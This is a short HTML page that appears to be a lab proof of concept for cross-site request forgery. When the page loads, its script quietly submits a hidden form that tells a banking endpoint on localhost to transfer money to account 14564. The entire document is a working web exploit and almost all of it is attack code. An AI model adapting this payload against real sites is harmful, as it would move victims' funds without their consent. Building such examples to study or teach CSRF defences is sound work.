<html>
<body>
	<h2>You Are Attacked By CSRF</h2>
	<script type="text/javascript">
		function forge_post(){
			var fields;
			fields += "<input type='hidden' name='dest_acc_no' value='14564'>";
			fields += "<input type='hidden' name='amount' value='5'>";

			var p= document.createElement("form");
			p.action= "http://localhost/8_fund_transfer_action.php";
			p.innerHTML = fields;
			p.method = "POST";
			document.body.appendChild(p);
			p.submit();
		}
		window.onload=function() { forge_post(); }
	</script>
</body>
</html>